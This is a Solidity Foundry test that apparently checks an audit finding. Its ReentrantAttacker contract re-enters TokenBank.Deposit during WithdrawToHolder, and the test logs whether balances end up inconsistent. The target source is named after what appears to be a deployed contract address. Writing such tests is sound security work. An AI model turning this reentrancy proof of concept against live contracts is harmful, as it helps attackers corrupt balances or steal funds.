// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x3a0e9acd953ffc0dd18d63603488846a6b8b2b01.sol";

contract ReentrantAttacker {
    TokenBank public tokenBank;
    address public owner;
    bool public attacked;
    
    constructor(TokenBank _tokenBank) {
        tokenBank = _tokenBank;
        owner = msg.sender;
    }
    
    receive() external payable {
        if (!attacked && msg.sender == address(tokenBank)) {
            attacked = true;
            tokenBank.Deposit{value: 1.1 ether}();
        }
    }
}

contract TokenBankReentrancyTest is Test {
    TokenBank public tokenBank;
    ReentrantAttacker public attacker;
    address public owner = vm.addr(1);
    address public alice = vm.addr(2);
    
    function setUp() public {
        vm.deal(owner, 10 ether);
        vm.deal(alice, 10 ether);
        vm.deal(address(this), 10 ether);

        vm.prank(owner);
        tokenBank = new TokenBank();
        
        attacker = new ReentrantAttacker(tokenBank);
        vm.deal(address(attacker), 10 ether);
    }
    
    function testReentrancyInWithdrawToHolder() public {
        // Owner becomes a holder with deposit
        vm.prank(owner);
        tokenBank.Deposit{value: 1.1 ether}();
        
        // Attacker deposit setup
        vm.prank(address(attacker));
        tokenBank.Deposit{value: 2 ether}();

        console.log("--- BEFORE-Trigger ---");
        uint holderBalBefore = tokenBank.Holders(address(attacker));
        uint bankBalBefore = address(tokenBank).balance;
        console.log("Attacker contract holder balance:", holderBalBefore);
        console.log("TokenBank ETH balance:", bankBalBefore);

        // Withdraw to attacker - triggers reentrancy
        console.log("--- Trigger WithdrawToHolder ---");
        vm.prank(owner);
        tokenBank.WithdrawToHolder(address(attacker), 2 ether);

        console.log("--- AFTER-Trigger ---");
        uint holderBalAfter = tokenBank.Holders(address(attacker));
        uint bankBalAfter = address(tokenBank).balance;
        console.log("Attacker contract holder balance:", holderBalAfter);
        console.log("TokenBank ETH balance:", bankBalAfter);

        // Calculate differences
        uint holderDiff = holderBalBefore - holderBalAfter;
        uint bankDiff = bankBalBefore - bankBalAfter;
        bool reenterDetected = (holderBalAfter == 1.1 ether) && 
                               (bankBalAfter == (bankBalBefore - 2 ether + 1.1 ether)) &&
                               (holderDiff == bankDiff);

        // Print verdict based on state changes
        if (reenterDetected) {
            console.log("Vulnerability Exists: Reentrancy attack succeeded as attacker contract's deposit was processed during withdrawal, resulting in inconsistent state updates");
        } else {
            console.log("Vulnerability not Exist: State changes did not match reentrancy pattern - holder and bank balances not updated as expected");
        }
    }
}